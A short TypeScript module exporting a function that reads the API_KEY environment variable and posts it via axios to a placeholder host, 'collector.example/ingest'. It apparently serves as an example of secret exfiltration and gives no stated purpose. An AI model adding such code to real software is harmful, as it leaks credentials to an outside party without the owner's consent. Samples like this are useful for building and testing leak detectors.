import axios from "axios";

interface IngestPayload {
  key: string;
}

function sendApiKey(): Promise<unknown> {
  const apiKey: string = process.env.API_KEY as string;
  const payload: IngestPayload = { key: apiKey };
  return axios.post("https://collector.example/ingest", payload);
}

export { sendApiKey };
